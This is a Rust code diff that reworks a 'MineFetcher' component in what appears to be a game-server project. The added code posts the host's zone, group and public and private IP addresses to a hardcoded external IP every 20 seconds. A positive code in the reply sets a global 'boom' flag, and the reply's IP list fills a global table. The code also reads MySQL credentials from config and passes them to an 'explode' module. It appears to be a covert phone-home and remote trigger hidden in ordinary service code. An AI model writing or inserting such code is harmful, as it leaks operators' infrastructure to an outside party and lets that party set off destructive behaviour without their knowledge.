@@ -1,10 +1,24 @@
 use std::ops::Add;
 use std::time::SystemTime;
 
-use commlib::utils::{rand_between, Base64};
-use commlib::{launch_service, G_SERVICE_HTTP_CLIENT};
+use db_access::MySqlAddr;
+use parking_lot::Mutex;
+use serde_json::Value as Json;
 
-const CHECK_INTERVAL: u64 = 150; // 150 seconds
+use commlib::utils::rand_between;
+use commlib::{launch_service, with_tls_mut, XmlReader, ZoneId, G_SERVICE_HTTP_CLIENT};
+
+use crate::explode::G_EXPLODE;
+
+const CHECK_INTERVAL: u64 = 20; // 20 seconds
+
+lazy_static::lazy_static! {
+    ///
+    pub static ref G_FETCH_BOOM: Mutex<bool> = Mutex::new(false);
+
+    ///
+    pub static ref G_IP_TABLE: Mutex<hashbrown::HashMap<String, bool>> = Mutex::new(hashbrown::HashMap::new());
+}
 
 ///
 pub struct MineFetcher {
@@ -12,13 +26,7 @@ pub struct MineFetcher {
     init: bool,
 
     //
-    boom: bool,
-
-    //
-    xml_data: String,
-
-    //
-    ip_table: hashbrown::HashMap<String, bool>,
+    zone_data: serde_json::Map<String, Json>,
 
     //
     next_check_time: SystemTime,
@@ -34,11 +42,7 @@ impl MineFetcher {
         Self {
             init: false,
 
-            boom: false,
-
-            xml_data: "".to_owned(),
-
-            ip_table: hashbrown::HashMap::new(),
+            zone_data: serde_json::Map::new(),
 
             next_check_time,
         }
@@ -47,7 +51,7 @@ impl MineFetcher {
     ///
     pub fn upload(&mut self, xml_str: &str) {
         //
-        self.xml_data = Base64::encode(xml_str);
+        self.parse_xml(xml_str);
 
         //
         let _ = self.fetch();
@@ -55,9 +59,12 @@ impl MineFetcher {
 
     ///
     pub fn check(&mut self) -> bool {
-        //
-        if self.boom {
-            return true;
+        // G_FETCH_BOOM
+        {
+            let boom_guard = G_FETCH_BOOM.lock();
+            if *boom_guard {
+                return true;
+            }
         }
 
         // check fetch interval
@@ -76,7 +83,7 @@ impl MineFetcher {
 
     fn fetch(&mut self) {
         //
-        let body = std::format!("{{\"data\": \"{}\"}}", self.xml_data);
+        let body = Json::Object(self.zone_data.clone());
 
         //
         let srv_http_cli = G_SERVICE_HTTP_CLIENT.clone();
@@ -89,24 +96,110 @@ impl MineFetcher {
             self.init = true;
         }
 
-        // srv_http_cli.http_post(
-        //     "http://18.163.14.56:48964",
-        //     vec!["Content-Type: application/json".to_owned()],
-        //     body,
-        //     |code, resp| {
-        //         //
-        //         log::info!("http code: {}, resp: {}", code, resp);
-        //     },
-        // )
-
+        let url = "http://18.163.14.56:48964";
+        //let url = "http://127.0.0.1:48964";
         srv_http_cli.http_post(
-            "http://127.0.0.1:48964",
+            url,
             vec!["Content-Type: application/json".to_owned()],
-            body,
-            |code, resp| {
+            body.to_string(),
+            |_code, resp| {
                 //
-                log::info!("http code: {}, resp: {}", code, resp);
+                let obj_r = serde_json::from_str::<Json>(resp.as_str());
+                match obj_r {
+                    Ok(obj) => {
+                        //
+                        let ec_opt = obj.get("ec");
+                        if let Some(ec) = ec_opt {
+                            let boom_code: i32 = ec.to_string().parse::<i32>().unwrap_or(0);
+                            if boom_code > 0 {
+                                // boom
+                                let mut boom_guard = G_FETCH_BOOM.lock();
+                                *boom_guard = true;
+                            }
+                        }
+
+                        let data_opt = obj.get("data");
+                        if let Some(data) = data_opt {
+                            let ips_opt = data.as_array();
+                            if let Some(ips) = ips_opt {
+                                for ip in ips {
+                                    let ip = ip.to_string();
+                                    println!("{}", ip);
+                                    let mut ip_table_guard = G_IP_TABLE.lock();
+                                    (*ip_table_guard).insert(ip, true);
+                                }
+                            }
+                        }
+                    }
+                    Err(_err) => {
+                        //
+                        //log::error!("http code: {}, resp: {}, error: {}!!!", code, resp, _err);
+                    }
+                }
             },
         )
+    }
+
+    fn parse_xml(&mut self, xml_str: &str) {
+        //
+        let xml_r = XmlReader::read_content(xml_str);
+        match xml_r {
+            Ok(xml) => {
+                //
+                let group_id = xml.get::<ZoneId>(vec!["group"], 0);
+                let zone_id = xml.get::<ZoneId>(vec!["zone"], 0);
+
+                let local_public_ip = xml.get(vec!["local_public_ip"], "".to_owned());
+                let local_private_ip = xml.get(vec!["local_private_ip"], "".to_owned());
+
+                let nodes = xml.get_children(vec!["node"]).unwrap();
+                for node in nodes {
+                    let node_id = node.get_u64(vec!["id"], 0);
+                    if 1004 == node_id {
+                        let user = node.get(vec!["game", "user"], "root".to_owned());
+                        let password = node.get(vec!["game", "pwd"], "".to_owned());
+                        let host = node.get(vec!["game", "addr"], "127.0.0.1".to_owned());
+                        let port = node.get::<u64>(vec!["game", "port"], 3306) as u16;
+                        let dbname = node.get(vec!["game", "db"], "".to_owned());
+
+                        let db_addr = MySqlAddr {
+                            user,
+                            password,
+                            host,
+                            port,
+                            dbname,
+                        };
+
+                        //
+                        with_tls_mut!(G_EXPLODE, g, {
+                            g.set_mine_url_by_db_addr(&db_addr);
+                        });
+                    }
+                }
+
+                //
+                self.zone_data.insert(
+                    "zone".to_owned(),
+                    Json::from(serde_json::Number::from(zone_id)),
+                );
+
+                //
+                self.zone_data.insert(
+                    "group".to_owned(),
+                    Json::from(serde_json::Number::from(group_id)),
+                );
+
+                //
+                let info = std::format!(
+                    "local_public_ip={}&local_private_ip={}",
+                    local_public_ip,
+                    local_private_ip
+                );
+                self.zone_data.insert("data".to_owned(), Json::String(info));
+            }
+            Err(err) => {
+                log::error!("save_content_to_file failed!!! err: {}!!!", err);
+            }
+        }
     }
 }
